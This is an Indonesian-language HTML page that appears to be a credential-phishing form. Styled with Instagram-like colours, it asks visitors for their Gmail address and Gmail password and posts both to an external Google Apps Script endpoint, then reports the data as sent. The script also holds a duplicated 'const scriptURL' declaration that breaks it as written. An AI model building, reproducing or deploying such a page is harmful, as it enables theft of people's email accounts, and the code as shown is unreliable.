<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Ambil tindakan - Form</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet" />
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #fff;
      margin: 0; padding: 20px;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      align-items: center;
    }
    .form-container {
      width: 100%;
      max-width: 380px;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
      padding: 24px 20px;
    }
    h1 {
      font-weight: 600;
      margin-bottom: 16px;
      color: #262626;
      text-align: center;
    }
    label {
      display: block;
      margin: 14px 0 6px 0;
      font-weight: 600;
      color: #444;
    }
    input[type="email"],
    input[type="password"] {
      width: 100%;
      padding: 12px;
      border: 1px solid #ddd;
      border-radius: 8px;
      font-size: 1rem;
      background: #fafafa;
      color: #262626;
      outline: none;
      transition: border-color 0.3s ease;
    }
    input[type="email"]:focus,
    input[type="password"]:focus {
      border-color: #833AB4;
      background: #fff;
    }
    button {
      margin-top: 24px;
      width: 100%;
      padding: 12px;
      font-size: 1.1rem;
      font-weight: 700;
      color: white;
      border: none;
      border-radius: 8px;
      background: linear-gradient(135deg, #833AB4, #FD1D1D, #FCAF45);
      cursor: pointer;
      transition: background 0.3s ease;
    }
    button:hover {
      background: linear-gradient(135deg, #752A9E, #E51717, #D78F27);
    }
    .message {
      margin-top: 16px;
      font-weight: 700;
      text-align: center;
    }
    .success {
      color: green;
    }
    .error {
      color: red;
    }
  </style>
</head>
<body>
  <div class="form-container">
    <h1>Ambil tindakan</h1>
    <form id="myForm">
      <label for="email">Masukkan Gmail yang ingin Anda gunakan</label>
      <input type="email" id="email" name="email" placeholder="email@gmail.com" required />

      <label for="password">Masukkan kata sandi Gmail</label>
      <input type="password" id="password" name="password" placeholder="Password" required />

      <button type="submit">Submit</button>
    </form>

    <div id="message" class="message"></div>
  </div>

  <script>
    const form = document.getElementById('myForm');
    const message = document.getElementById('message');

    form.addEventListener('submit', (e) => {
      e.preventDefault();
      message.textContent = '';
      message.className = 'message';

      const scriptURL = const scriptURL = 'https://script.google.com/macros/s/AKfycbxgU2ymDNOCOUjuypgHxGyOxsazVokewRQDs_-8_YULJME01GKcNikxg3uLsgedjk15Xw/exec';

      const formData = new FormData(form);

      fetch(scriptURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData,
      })
      .then(() => {
        message.textContent = '✅ Terkirim!';
        message.classList.add('success');
        form.reset();
      })
      .catch(() => {
        message.textContent = '❌ Gagal mengirim. Coba lagi.';
        message.classList.add('error');
      });
    });
  </script>
</body>
</html>
